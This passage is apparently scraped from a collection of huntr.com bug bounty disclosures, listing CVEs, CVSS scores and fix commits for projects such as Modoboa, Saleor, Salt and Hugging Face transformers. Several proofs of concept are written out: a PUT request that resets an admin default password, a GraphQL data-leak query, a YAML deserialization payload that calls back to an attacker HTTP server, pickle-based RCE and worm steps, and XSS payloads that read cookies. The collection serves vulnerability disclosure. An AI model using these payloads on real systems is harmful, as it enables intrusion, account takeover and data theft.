en\n\n{\"label\":\"General\",\"params\":{\"authentication_type\":\"local\",\"password_scheme\":\"sha512crypt\",\"rounds_number\":70000,\"update_scheme\":true,\"default_password\":\"Pwned-by-7h3h4ckv157\",\"random_password_length\":8,\"update_password_url\":\"\",\"password_recovery_msg\":\"\",\"sms_password_recovery\":false,\"sms_provider\":null,\"ldap_server_address\":\"localhost\",\"ldap_server_port\":389,\"ldap_enable_secondary_server\":false,\"ldap_secondary_server_address\":\"localhost\",\"ldap_secondary_server_port\":389,\"ldap_secured\":\"none\",\"ldap_is_active_directory\":false,\"ldap_admin_groups\":\"\",\"ldap_group_type\":\"posixgroup\",\"ldap_groups_search_base\":\"\",\"ldap_password_attribute\":\"userPassword\",\"ldap_auth_method\":\"searchbind\",\"ldap_bind_dn\":\"\",\"ldap_bind_password\":\"\",\"ldap_search_base\":\"\",\"ldap_search_filter\":\"(mail=%(user)s)\",\"ldap_user_dn_template\":\"\",\"ldap_sync_bind_dn\":\"\",\"ldap_sync_bind_password\":\"\",\"ldap_enable_sync\":false,\"ldap_sync_delete_remote_account\":false,\"ldap_sync_account_dn_template\":\"\",\"ldap_enable_import\":false,\"ldap_import_search_base\":\"\",\"ldap_import_search_filter\":\"(cn=*)\",\"ldap_import_username_attr\":\"cn\",\"ldap_dovecot_sync\":false,\"ldap_dovecot_conf_file\":\"/etc/dovecot/dovecot-modoboa.conf\",\"rss_feed_url\":null,\"hide_features_widget\":false,\"sender_address\":\"noreply@yourdomain.test\",\"enable_api_communication\":true,\"check_new_versions\":true,\"send_new_versions_email\":false,\"new_versions_email_rcpt\":\"postmaster@yourdomain.test\",\"send_statistics\":true,\"inactive_account_threshold\":30,\"top_notifications_check_interval\":30,\"log_maximum_age\":365,\"items_per_page\":30,\"default_top_redirection\":\"user\",\"sms_ovh_endpoint\":\"ovh-eu\",\"sms_ovh_application_key\":null,\"sms_ovh_application_secret\":null,\"sms_ovh_consumer_key\":null}}\nThe response contained sensitive information which could be used by an attacker to gain unauthorized access to the system. This issue poses a significant risk to the confidentiality and integrity of the system and its users, because the information returns from the request can be modified using another PUT request.\nRequest\nPUT /api/v2/parameters/core/ HTTP/1.1\nHost: demo.modoboa.org\nUser-Agent: 7h3h4ckv157\nAccept: application/json, text/plain, */*\nAccept-Language: en\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nContent-Length: 1680\nConnection: close\n\n{\"authentication_type\":\"local\",\"password_scheme\":\"sha512crypt\",\"rounds_number\":70000,\"update_scheme\":true,\"default_password\":\"Pwned-by-7h3h4ckv157\",\"random_password_length\":8,\"update_password_url\":\"\",\"password_recovery_msg\":\"\",\"sms_password_recovery\":false,\"sms_provider\":null,\"ldap_server_address\":\"localhost\",\"ldap_server_port\":389,\"ldap_enable_secondary_server\":false,\"ldap_secondary_server_address\":\"localhost\",\"ldap_secondary_server_port\":389,\"ldap_secured\":\"none\",\"ldap_is_active_directory\":false,\"ldap_admin_groups\":\"\",\"ldap_group_type\":\"posixgroup\",\"ldap_groups_search_base\":\"\",\"ldap_password_attribute\":\"userPassword\",\"ldap_auth_method\":\"searchbind\",\"ldap_bind_dn\":\"\",\"ldap_bind_password\":\"\",\"ldap_search_base\":\"\",\"ldap_search_filter\":\"(mail=%(user)s)\",\"ldap_user_dn_template\":\"\",\"ldap_sync_bind_dn\":\"\",\"ldap_sync_bind_password\":\"\",\"ldap_enable_sync\":false,\"ldap_sync_delete_remote_account\":false,\"ldap_sync_account_dn_template\":\"\",\"ldap_enable_import\":false,\"ldap_import_search_base\":\"\",\"ldap_import_search_filter\":\"(cn=*)\",\"ldap_import_username_attr\":\"cn\",\"ldap_dovecot_sync\":false,\"ldap_dovecot_conf_file\":\"/etc/dovecot/dovecot-modoboa.conf\",\"rss_feed_url\":null,\"hide_features_widget\":false,\"sender_address\":\"noreply@yourdomain.test\",\"enable_api_communication\":true,\"check_new_versions\":true,\"send_new_versions_email\":false,\"new_versions_email_rcpt\":\"postmaster@yourdomain.test\",\"send_statistics\":true,\"inactive_account_threshold\":30,\"top_notifications_check_interval\":30,\"log_maximum_age\":365,\"items_per_page\":30,\"default_top_redirection\":\"user\",\"sms_ovh_endpoint\":\"ovh-eu\",\"sms_ovh_application_key\":null,\"sms_ovh_application_secret\":null,\"sms_ovh_consumer_key\":null}\nResponse\nHTTP/1.1 200 OK\nServer: nginx/1.14.2\nDate: Sat, 25 Feb 2023 03:24:46 GMT\nContent-Length: 0\nConnection: close\nVary: Accept, Accept-Language, Cookie\nAllow: GET, PUT, HEAD, OPTIONS\nX-Frame-Options: SAMEORIGIN\nContent-Language: en\nProof of Concept\nImpact\nThe impact of this vulnerability is severe, as it allows an attacker to gain sensitive information and modify it, posing a significant risk to the confidentiality and integrity of the system and its users' data. It is critical to address this vulnerability immediately to prevent any further exploitation by malicious actors."}, "https://huntr.com/bounties/144659fe-49e1-4c47-923f-fe870b2ec4bd/": {"cve": "CVE-2022-22967", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-22967", "cwe": "CWE-285: Improper Authorization", "cwe_link": "https://cwe.mitre.org/data/definitions/285.html", "severity_score": "Critical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/saltstack/salt", "fix_commit": "https://www.github.com/saltstack/salt/commit/d9343cca650d7197d3f6e107ffd506d25a8748ab", "description": "Description\nWhen configuring saltstack to authentificate via the salt.auth.pam module. The authorization of a account validity is missing. Therefore expired accounts, or accounts with expired passwords, can still login.\nProof of Concept\nConfigure salt with salt.auth.pam and run it with an expired account. To expire an PAM account use: chage -E0 <username>\nImpact\nAfter successfull authentication with pam_authenticateit's necessary to check the validity of an account with pam_acct_mgmt(). This is done, but the return value is discarded and only the return value of pam_authenticateis being used which results in skipping for authorization completely. Depending on how salt is configured this can become pretty severe. You don't revoke privileges for an account without a reason. As always I assume that the salt developers could estimate the severity way better than I could, so feel free to correct it."}, "https://huntr.com/bounties/f41645ff-c2a9-4920-a61e-915f890a7229/": {"cve": "", "cve_link": "", "cwe": "CWE-285: Improper Authorization", "cwe_link": "https://cwe.mitre.org/data/definitions/285.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/sissbruecker/linkding", "fix_commit": "https://www.github.com/sissbruecker/linkding/commit/1ffc3e02667b4218b6d39c36f9cbdfe8418dd2d0", "description": "Description\nThere are multiple idors i found. In bookmarks/<int:bookmark_id>/edit, bookmarks/<int:bookmark_id>/remove, bookmarks/<int:bookmark_id>/archive, bookmarks/<int:bookmark_id>/unarchive. It gets the object provided in the bookmark_id without checking if the owner of the object is the current user.\nProof of Concept\n1. Go to https://demo.linkding.link/bookmarks/5/remove\n2. The bookmark id 5 will be removed even if you dont own the bookmark. \nImpact\nIdor"}, "https://huntr.com/bounties/7aa921fc-a568-4fd8-96f4-7cd826246aa5/": {"cve": "CVE-2022-1049", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-1049", "cwe": "CWE-285: Improper Authorization", "cwe_link": "https://cwe.mitre.org/data/definitions/285.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/clusterlabs/pcs", "fix_commit": "https://www.github.com/clusterlabs/pcs/commit/fb860005117dc9e092649687dfa1304fb423efc5", "description": "Description\nPacemakers daemon pcsd allows authentication via PAMs pam_authenticate. Unfortunately the authorization via pam_acct_mgmt has been omitted. Therefore unprivileged expired accounts that have been denied access can still login.\nProof of Concept\nYou can expire an account with chage -E0 <username>\nImpact\nSince disabling an account in PAM still allows to login via ssh-keys, it's common to set accounts to expire if you want to deny access. So accounts who technically don't have any privilege are still allowed to login here. This also counts for accounts with expired passwords. A fix is supplied in the report."}, "https://huntr.com/bounties/c458b868-63df-414e-af10-47e3745caa1d/": {"cve": "CVE-2022-0860", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0860", "cwe": "CWE-285: Improper Authorization", "cwe_link": "https://cwe.mitre.org/data/definitions/285.html", "severity_score": "High (8.2)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/cobbler/cobbler", "fix_commit": "https://www.github.com/cobbler/cobbler/commit/9044aa990a94752fa5bd5a24051adde099280bfa", "description": "Description\nWhen configuring cobbler-web to authentificate via PAM. The authorization of a account validity is missing. Therefore expired accounts can still login.\nProof of Concept\nEnable authn_pam in the modules.conf\n\nCreate a testuser to login\n\n    $ useradd expired_user\n\n    $ passwd expired_user\n    # 12345\n\n    $ chage -E0 expired_user\n\nLogin via cobbler-web and see that it works although you don't have any privileges anymore.\nImpact\nSince disabling an account still would allow login via ssh-keys or alike, it is common usage to expire an PAM account. Therefore the PAM library demands to check the handle with pam_acct_mgmt() after successful pam_authenticate()\nAfter successfull authentication, the authorization of the user is not checked via pam_acct_mgmt(). This allows access to accounts that have been expired or have expired passwords. Both should be declined access by PAM convention. Depending on how cobbler is configured this can become pretty severe. You don't revoke privileges for an account without a reason."}, "https://huntr.com/bounties/88ae4cbc-c697-401b-8b04-7dc4e03ad8eb/": {"cve": "CVE-2022-0932", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0932", "cwe": "CWE-285: Improper Authorization", "cwe_link": "https://cwe.mitre.org/data/definitions/285.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/saleor/saleor", "fix_commit": "https://www.github.com/saleor/saleor/commit/521dfd6394f3926a77c60d8633c058e16d0f916d", "description": "Title\nGraphQL traversal due to missing permission checks\nDescription\norders and customers fields allow to access each other via nodes edges. However, connections don't check user's permissions, which allows, for instance, a staff with just Customers permissions get full information about the order, though direct access is forbidden.\nSteps to reproduce\nI will use a \"Staff without Orders permission\" scenario\n1. As an admin create a staff, add this account to a group with just Customers permission.\n2. As a created staff observe that direct access to the orders is not allowed:\n{\n  \"query\":\"{ orders(first: 10) { edges { node { id } } } }\"\n}\nThis POST query to http://localhost:8000/graphql/ returns You do not have permission to perform this action.\n3. Go to a page of any customer with at least one order and note that UI shows Recent orders with just \"No. of Order\", \"Date\", \"Status\" and \"Total\" fields. However, if you try to see the full information about an order and click on it , you'll get Ooops!... Something's missing, as you don't have enough permissions.\nNow run this query and receive full information about all orders:\n{\n\"query\":\"{ customers(first: 10) { edges { node { firstName, orders(first: 10) { edges { node { id, trackingClientId, voucher { id }, giftCards { id }, discount { amount }, discountName, customerNote, weight { value }, metadata { key, value }, fulfillments { id, status }, lines { id, productName, quantity }, actions, total { gross { amount } }, isPaid } } } } } } }\"\n}\nThe most interesting field here is definitely lines, as it completely leaks the order.\nPossible remediation\nThough some fields on orders must be visible to a staff with only Customers permission to see the brief info about the last orders, an access to such fields as lines should be restricted.\nImpact\nThis vulnerability is capable of leaking customer's private information."}, "https://huntr.com/bounties/ed88e240-99ff-48a1-bf32-8e1ef5f13cce/": {"cve": "CVE-2023-0055", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0055", "cwe": "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute", "cwe_link": "https://cwe.mitre.org/data/definitions/614.html", "severity_score": "Low (3.1)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pyload/pyload", "fix_commit": "https://www.github.com/pyload/pyload/commit/7b53b8d43c2c072b457dcd19c8a09bcfc3721703", "description": "Description\nThe Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.\nProof of Concept\nHTTP/1.1 200 OK\nContent-Type: application/json\nContent-Length: 107\nVary: Accept-Encoding\nSet-Cookie: pyload_session=28d0985f-aea1-490b-9954-866be697d8ad; Expires=Fri, 03 Feb 2023 05:47:17 GMT; HttpOnly; Path=/; SameSite=Lax\nConnection: close\nDate: Tue, 03 Jan 2023 05:47:17 GMT\nServer: Cheroot/8.6.0\nImpact\nUser's cookies can be sent to the server with an unencrypted request over the HTTP protocol. This is not secure."}, "https://huntr.com/bounties/b9a1b411-060b-4235-9426-e39bd0a1d6d9/": {"cve": "CVE-2022-3251", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3251", "cwe": "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute", "cwe_link": "https://cwe.mitre.org/data/definitions/614.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/minarca", "fix_commit": "https://www.github.com/ikus060/minarca/commit/7b5c7e6cbd59268d5cd4f1b5f42e721db116f71a", "description": "Description\nUser's session id with secure attribute is false. This vulnerability makes user's cookies can be sent to the server with an unencrypted request over the HTTP protocol.\nProof of Concept\nOpen the browser and get access to the minarca website, for this scenario I have used the demo/test website. Check the cookie in browser's dev tool and realize that the cookie with Secure attribute is false.\nImpact\nThis vulnerability makes user's cookies can be sent to the server with an unencrypted request over the HTTP protocol."}, "https://huntr.com/bounties/39889a3f-8bb7-448a-b0d4-a18c671bbd23/": {"cve": "CVE-2022-3250", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3250", "cwe": "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute", "cwe_link": "https://cwe.mitre.org/data/definitions/614.html", "severity_score": "Medium (4.9)\nAttack vector\nAdjacent\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/ac334dd27ceadac0661b1e2e059a8423433c3fee", "description": "Description\nThe cookie session_id does not have secure attribute when the URL is invalid\nProof of Concept\n1.Login into the application. 2.Send the request https://rdiffweb-demo.ikus-soft.com/browse/admin/MyWindowsLaptop/D/TC3080/test.\nImpact\nSecure attribute is necessary so the cookie is secure."}, "https://huntr.com/bounties/d8a32bd6-c76d-4140-a5ca-ef368a3058ce/": {"cve": "CVE-2022-3174", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3174", "cwe": "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute", "cwe_link": "https://cwe.mitre.org/data/definitions/614.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/f2de2371c5e13ce1c6fd6f9a1ed3e5d46b93cd7e", "description": "Description\nUser's session id with secure attribute is false. This vulnerability makes user's cookies can be sent to the server with an unencrypted request over the HTTP protocol.\nProof of Concept\nOpen the browser and access to the website, in this scenario I use the demo website. Check the cookie in browser's dev tool and realize that the cookie with Secure attribute is false.\nImpact\nThis vulnerability makes user's cookies can be sent to the server with an unencrypted request over the HTTP protocol."}, "https://huntr.com/bounties/91606453-1ee9-4b5c-9136-5d5925b94ae1/": {"cve": "", "cve_link": "", "cwe": "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute", "cwe_link": "https://cwe.mitre.org/data/definitions/614.html", "severity_score": "Medium (5.6)\nAttack vector\nAdjacent\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/spiral-project/ihatemoney", "fix_commit": "https://www.github.com/spiral-project/ihatemoney/commit/e626a1cbea766ce15d528e7379208435aa5cad4f", "description": "Description\nSecure flag is not implemented on the application\nProof of Concept\nhttps://drive.google.com/file/d/10p4ejCFsLA6LO32nPNTRKqZjlqVHVpUf/view?usp=sharing\nImpact\nThe secure flag is an option that can be set by the application server when sending a new cookie to the user within an HTTP Response. The purpose of the secure flag is to prevent cookies from being observed by unauthorized parties due to the transmission of a the cookie in clear text. To accomplish this goal, browsers which support the secure flag will only send cookies with the secure flag when the request is going to a HTTPS page. Said in another way, the browser will not send a cookie with the secure flag set over an unencrypted HTTP request. By setting the secure flag, the browser will prevent the transmission of a cookie over an unencrypted channel."}, "https://huntr.com/bounties/ac100c04-9078-41a8-b002-57014bd4d728/": {"cve": "", "cve_link": "", "cwe": "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute", "cwe_link": "https://cwe.mitre.org/data/definitions/614.html", "severity_score": "Medium (5.5)\nAttack vector\nAdjacent\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/openfun/openedx-docker", "fix_commit": "https://www.github.com/openfun/openedx-docker/commit/d2bf8afe38e717d8ffb9705578035ea0bbb76688", "description": "Description\nSecure flag is not implemented on the application\nProof of Concept\nhttps://drive.google.com/file/d/10vEIf77qf1ejR14lL5GZCMn9bZmmbIBd/view?usp=sharing\nImpact\nThe secure flag is an option that can be set by the application server when sending a new cookie to the user within an HTTP Response. The purpose of the secure flag is to prevent cookies from being observed by unauthorized parties due to the transmission of a the cookie in clear text. To accomplish this goal, browsers which support the secure flag will only send cookies with the secure flag when the request is going to a HTTPS page. Said in another way, the browser will not send a cookie with the secure flag set over an unencrypted HTTP request. By setting the secure flag, the browser will prevent the transmission of a cookie over an unencrypted channel."}, "https://huntr.com/bounties/e1a3e548-e53a-48df-b708-9ee62140963c/": {"cve": "CVE-2023-7018", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-7018", "cwe": "CWE-502: Deserialization of Untrusted Data", "cwe_link": "https://cwe.mitre.org/data/definitions/502.html", "severity_score": "Critical (9.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/huggingface/transformers", "fix_commit": "https://www.github.com/huggingface/transformers/commit/1d63b0ec361e7a38f1339385e8a5a855085532ce", "description": "Description\nThe huggingface/transformers implements TransfoXLTokenizer to automatically load vocab.pkl file from the remote repo using the risky pickle.load without any restrictions, which make the victim users vulerable to remote code execution attacks by simply running the demo code AutoTokenizer.from_pretrained(\"the repo deployed with malicious vocab.pkl file\"). We understand the huggingface implements a pickle scanning to flag the unsafe file alert if the os.system and many other black-listed modules imported in the vocab.pkl. But we can bypass this unsafe alert in our attacking repo by launching the real attack in another repo. Saying we have two repos A and B. In the repo A, we just deploy the malicious vocab.pkl with the execution of AutoTokenizer.from_pretrained(\"B\"), and in the repo B, we deploy the malicious vocab.pkl with the OS commands we try to execute. By this way, the repo A looks bengin since its vocab.pkl do not contain any black-listed imports, but the victim users who fetch the pretrained TransfoXLTokenizer models from repo A will be forced to execute the malicious command deployed in repo B. It is worth noting that, the victim users cannot find any tricks for the existent of the repo B in the repo A in huggingface websites.\nProof of Concept\nWe deploy a PoC repo in https://huggingface.co/zpbrent/test, by which you can run the following code to fetch the pretrained TransfoXLTokenizer in your local machine:\n# Load model directly\nfrom transformers import AutoTokenizer, AutoModelForCausalLM\n\ntokenizer = AutoTokenizer.from_pretrained(\"zpbrent/test\")\nand then you can find a HACKED filed has been created in your machine, which means our malicious OS command touch HACKED has been successfully executed.\nNote that, in our current PoC demo, you may see the ValueError: Unknown format at the end of the code execution (despite this cannot prevent the execution of our malicious commands), this is because we have not embedded our malicious payloads in some normal vocab.pkl. To hide such errors, a possible way is to embed our attacking payload into some typical vocab.pkl for TransfoXL such as from https://huggingface.co/transfo-xl-wt103 and so on.\nImpact\nThis vulnerability can be exploited to execute arbitrary codes and OS commands in the victim machine who fetch the pretrained repo remotely, and obviously leading to disatrous consequences depending on which commands the malicious model includes."}, "https://huntr.com/bounties/423611ee-7a2a-442a-babb-3ed2f8385c16/": {"cve": "CVE-2023-6730", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6730", "cwe": "CWE-502: Deserialization of Untrusted Data", "cwe_link": "https://cwe.mitre.org/data/definitions/502.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/huggingface/transformers", "fix_commit": "https://www.github.com/huggingface/transformers/commit/1d63b0ec361e7a38f1339385e8a5a855085532ce", "description": "Description\nThe Hugging Face (HF) repo enables the remote users to fetch RagRetriever models from the hub by simply running the official demo function code RagRetriever.from_pretrained(). However, this demo function parses the remote config.json at first and can be misled by \"index_name\" and \"index_path\" to implicitly redirect the victim users to load pickle files from the other repos specified by \"index_path\", hence suffering deserialization attacks. In this vulnerable condition, the attackers have two repos, one is a frontend one to phish the victims to run the demo code RagRetriever.from_pretrained(frontend), and the other is a backend repo that holds the real attacking pickle file. The frontend repo redirects the victim users to load the backend one by setting {\"index_path\":backend} in its config.json. As the victim users are likely not aware of the existence of the backend repo, they just find the frontend repo safe enough, meaning the complete bypass of HF' pickle scanning.\nProof of Concept\nThe following steps show how to exploit unsafe pickle.load from RagRetriever models for reversed RCE and even worm infection over huggingface platform (We have a demo video deployed at https://zpbrent.github.io/pocs/demo-RagRetriever-worm.rar with password huggingfacerag for these steps):\n1), we have an attacker huggingface account zpbrent and a victim one pzhoutest\n2), the attacker zpbrent deploys a RagRetriever model zpbrent/RagRetriever for phishing. Note that the huggingface performs a pickle scanning to alert unsafe file for malicious pickle files, such as the backend repo deployed at zpbrent/RagReuse. However, our phishing repo zpbrent/RagRetriever can completely bypass this scanning.\n3), the victim pzhoutest do not have the RagRetriever model pzhoutest/RagRetriever before being attacked, and also no HACKED and HACKED-2 files in the disk.\n4), for reversed RCE, the pre-requisite is the victim pzhoutest has been attracted by the pretrained model deployed at repo zpbrent/RagRetriever.\n4.1), s/he finds this repo nothing \"unsafe\" and thus downloads this pretrained model using huggingface's official from_pretrained function RagRetriever.from_pretrained(\"zpbrent/RagRetriever\").\n4.1), the victim observes the model downloading complete.\n4.3), but meanwhile the HACKED and HACKED-2 files have been illegally created in the disk (meaning the success of reversed RCE).\n5), for worm infection, an additional pre-requisite is the victim pzhoutest has readily logged in huggingface with a \"write\" permission (huggingface-cli login --token xxx) when running the official from_pretrained function for downloading.\n5.1), a new repo pzhoutest/RagRetriever has been implicitly created and uploaded in victim pzhoutest's account, with the same contents of zpbrent/RagRetriever (meaning the success of worm infection).\nPoC repos:\nFrontend (public upon request):\nhttps://huggingface.co/zpbrent/RagRetriever\nBackend:\nhttps://huggingface.co/zpbrent/RagReuse\nImpact\nThis vulnerability can be exploited to execute arbitrary codes and OS commands in the victim machine that runs the demo function RagRetriever.from_pretrained() remotely, leading to reversed RCE and even worm infection. We have three new insights for this one:\n1, we can completely bypass the pickle scanning and make all the pickle files stored at the frontend phishing repo whitelisted.\n2, we take a step further to show how to exploit this kind of vulnerability to infect pickle malware across HF.\n3, this report involves two deserialization vulnerabilities from RagRetriever, one is triggered by psgs_w100.tsv.pkl and the other is by hf_bert_base.hnswSQ8_correct_phi_128.c_index.index_meta.dpr."}, "https://huntr.com/bounties/31832f0c-e5bb-4552-a12c-542f81f111e6/": {"cve": "CVE-2021-4118", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2021-4118", "cwe": "CWE-502: Deserialization of Untrusted Data", "cwe_link": "https://cwe.mitre.org/data/definitions/502.html", "severity_score": "High (7.8)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/pytorchlightning/pytorch-lightning", "fix_commit": "https://www.github.com/pytorchlightning/pytorch-lightning/commit/62f1e82e032eb16565e676d39e0db0cac7e34ace", "description": "Description\nThere is untrusted YAML Deserialization vulnerability on PyTorchLightning Github repository. PyTorchLightning's saving.py (core.saving.load_hparams_from_yaml) functionality is calling \"yaml.UnsafeLoader\" from pyyaml Python library which is not secure method. Because of that, maliciously crafted yaml config file can cause code execution on the victim's machine.\nProof of Concept\nHere is the poc.py file:\nfrom pytorch_lightning import core\ncore.saving.load_hparams_from_yaml(\"evil.yaml\")\nHere is the evil.yaml file:\n- !!python/object/new:yaml.MappingNode\n  listitems: !!str '!!python/object/apply:subprocess.Popen [[\"curl\", \"127.0.0.1:8080/rce\"]]'\n  state:\n    tag: !!str dummy\n    value: !!str dummy\n    extend: !!python/name:yaml.unsafe_load\nAfter that, you need to start HTTP server on your attacker machine's port 8080. When you run the below command, you will see the HTTP request from the victim host because of the malicious yaml file.\npython3 -m http.server 8080\nRun the poc.py file after that you will see HTTP request from coming the victim host,\npython3 poc.py\nImpact\nMaliciously crafted yaml config file can cause code execution on the victim's machine."}, "https://huntr.com/bounties/24835833-3421-412b-bafb-1b7ea3cf60e6/": {"cve": "CVE-2023-5689", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-5689", "cwe": "CWE-79: Cross-site Scripting (XSS) - DOM", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/d33d3cd2d11dbfebd8162c46e2c2a9873919a967", "description": "Description\nHello team, Recently i found that, DOM XSS on profile language field there is a DOM XSS\nProof of Concept\nVideo poc:\n\nhttps://screencast-o-matic.com/watch/c01067VBWlV\n\nStep:\n\n1. Login as simple user\n\n2. Click on settings and select profile tab.\n\n3. Click on change language as 'english' and then click on update \n\n4. Open burp suite and intercept request\n\n5. Modify language parameter as en to xss payload\n\n6. Click on forward request\n\n7. XSS store in language field and reflected\n\nPayload: <marquee onstart=alert(1)>xss</marquee>\nImpact\nXSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. The most severe XSS attacks involve disclosure of the user's session cookie, allowing an attacker to hijack the user's session and take over the account.can execute client side scrips etc"}, "https://huntr.com/bounties/0ceb10e4-952b-4ca4-baf8-5b6f12e3a8a7/": {"cve": "CVE-2023-5688", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-5688", "cwe": "CWE-79: Cross-site Scripting (XSS) - DOM", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/d33d3cd2d11dbfebd8162c46e2c2a9873919a967", "description": "Description\nI noticed, your website is very secure.\nBut you overlooked a flaw DOM XSS.\nDetail:\n1 .Login with demo account.\n2 .Go to the link: https://demo.modoboa.org/user/#profile/ and click Update\n3 .Use burp to block proxy and inject payload in &language:\n <img+src=0+onerror=alert(document.cookie)>  \nProof of Concept\nVideo Poc\nhttps://drive.google.com/file/d/1DpThlp36jJ7hcjGzehX4wlof3KsPux8O/view?usp=sharing\nImpact\nThis security vulnerability has the potential to steal multiple users' cookies, gain unauthorized access to that user's account through stolen cookies, or redirect the user to other malicious websites..."}, "https://huntr.com/bounties/09766c1e-c622-4a54-ab58-764436c8e32d/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - DOM", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nThe application inventree is vulnerable to Stored XSS in supplier company description field.\nProof of Concept\nVideo PoC Link: https://drive.google.com/file/d/115LLo4rxW7RzWd7hevbSFAlf-V83OUhU/view?usp=sharing\nImpact\nThis allows the attacker to execute malicious scripts in all the project members browser and it can lead to session 